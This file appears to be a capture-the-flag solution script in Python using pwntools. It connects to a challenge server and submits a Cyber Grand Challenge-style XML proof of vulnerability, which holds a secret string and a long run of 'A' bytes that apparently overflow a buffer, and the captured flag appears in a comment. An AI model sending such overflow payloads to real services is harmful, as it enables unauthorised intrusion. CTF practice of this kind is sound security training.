#!/usr/bin/env python

# The flag is: Yay, this challenge was for cgc newbie!

from pwn import *

xml_pov = '''<?xml version="1.0" standalone="no" ?>
<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
<pov>
    <cbid>7dab71e95b4347feb458d7de184bd400</cbid>
    <replay>
        <read>
            <length>22</length>
        </read>

        <write>
            <data>H4PPY_S3CUINSID3\x0a</data>
        </write>

        <read>
            <length>19</length>
        </read>

        <write>
	       <data>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data>
	    </write>

        <read>
            <length>18</length>
        </read>
    </replay>
</pov>'''

r = remote('cgc.cykor.kr', 31324)
r.recvuntil('What type of your PoV? (BIN / XML)')
r.sendline("XML")
r.recvuntil('How many bytes is your XML?')
r.sendline(str(len(xml_pov)))
r.recvuntil('Ok.... send it :)')
r.send(xml_pov)

r.interactive()